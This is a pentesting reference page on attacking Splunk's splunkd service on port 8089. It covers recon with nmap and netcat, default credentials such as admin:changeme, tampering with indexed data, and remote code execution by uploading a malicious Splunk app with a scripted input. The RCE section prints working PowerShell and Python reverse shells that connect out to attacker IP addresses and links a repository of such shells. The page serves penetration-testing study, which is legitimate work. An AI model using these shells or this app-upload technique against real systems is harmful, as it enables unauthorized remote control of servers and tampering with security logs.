# 8089 - Pentesting Splunkd

**Splunkd** is the core component of the Splunk platform, responsible for indexing, searching, and processing data ingested by Splunk. It provides a web interface and APIs for managing and analyzing machine-generated data.

Splunk is widely used for log management, security information and event management (SIEM), and data analytics in enterprise environments.

## **Basic Information**

* Log analytics tool used for data gathering, analysis, and visualization
* Commonly used in security monitoring and business analytics
* Default ports:
  * Web server: 8000
  * Splunkd service: 8089

## Connect
### Connect Using Web Interface
You can access the Splunk web interface by navigating to https://<splunk-server-ip>:8089 in a web browser.

### Connect Using Splunk CLI
Splunk CLI commands can be used for various administrative tasks and querying data. You can connect to Splunk using the following command:
```
splunk login -auth <username>:<password> -port 8089 -host <splunk-server-ip>
```
## Recon
### Identifying a Splunk Server
You can use Nmap to check if there's a Splunk server running on a target host like this:
```
nmap -p 8089 X.X.X.X
```
### Banner Grabbing
You can use tools like Netcat to perform banner grabbing and retrieve information about the Splunk service:
```
nc -nv X.X.X.X 8089
```
## Enumeration
### Splunkd API Endpoints
Splunkd exposes various API endpoints for interacting with the Splunk platform. You can enumerate these endpoints to gather information about the server and available functionalities.

## Attack Vectors
### Default Credentials
Check for default credentials or weak authentication configurations in Splunk instances, such as admin:admin or admin:<blank>.

### Unauthorized Access
Exploit misconfigured access controls or weak authentication mechanisms to gain unauthorized access to sensitive data stored in Splunk.

## Post-Exploitation
### Common Splunk CLI Commands

| Command	                      | Description                                         | 
--------------------------------|-----------------------------------------------------
| splunk search <query>	        |Perform a search query in Splunk.
| splunk list <entity>	         |List entities like indexes, sources, or sourcetypes.
| splunk info <entity>	         |Display detailed information about a specific entity.
| splunk add <entity> <name>	   | Add a new entity to Splunk (e.g., index, input).
| splunk delete <entity> <name>	| Delete an existing entity from Splunk.

### Data Manipulation
Manipulate indexed data in Splunk, such as modifying or deleting events, altering timestamps, or injecting fake data.

### Vulnerability Vectors:

1. Free Version Exploitation

* Trial version automatically converts to free version after 60 days
* Free version lacks authentication
* Potential security risk if left unmanaged
* Administrators may overlook security implications

2. Credential Weaknesses

* Older versions: Default credentials `admin:changeme`
* Newer versions: Credentials set during installation
* Potential for weak password use (e.g., `admin`, `Welcome`, `Password123`)

3. Remote Code Execution Opportunities

* Multiple code execution methods:
  * Server-side Django applications
  * REST endpoints
  * Scripted inputs
  * Alerting scripts
* Cross-platform support (Windows/Linux)
* Scripted inputs can run:
  * Bash scripts
  * PowerShell scripts
  * Batch scripts

Key Exploitation Potential:

* Sensitive data storage
* Lack of authentication in free version
* Multiple vectors for potential remote code execution
* Possibility of leveraging scripted inputs for system compromise

### Shodan

* `Splunk build`

## RCE

### Create Custom Application

Splunk offers a sophisticated method for remote code execution through custom application deployment, leveraging its cross-platform scripting capabilities. The core exploitation technique revolves around creating a malicious application that can execute reverse shells on both Windows and Linux systems.

A custom application can run **Python, Batch, Bash, or PowerShell scripts**. Moreover, **Splunk comes with Python installed**, so even in **Windows** systems you will be able to run python code.

You can use [**this**](https://github.com/0xjpuff/reverse_shell_splunk) example with the **`bin`** containing example for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Or you could create your own.

The exploitation process follows a consistent methodology across platforms:

```
splunk_shell/
├── bin        (reverse shell scripts)
└── default    (inputs.conf configuration)
```

The critical configuration file `inputs.conf` enables the script by:

* Setting `disabled = 0`
* Configuring a 10-second execution interval
* Defining the script's source type

Deployment is straightforward:

1. Create the malicious application package
2. Set up a listener (Netcat/socat) on the attacking machine
3. Upload the application through Splunk's interface
4. Trigger automatic script execution upon upload

Sample Windows PowerShell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

Sample Linux Python reverse shell:

```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
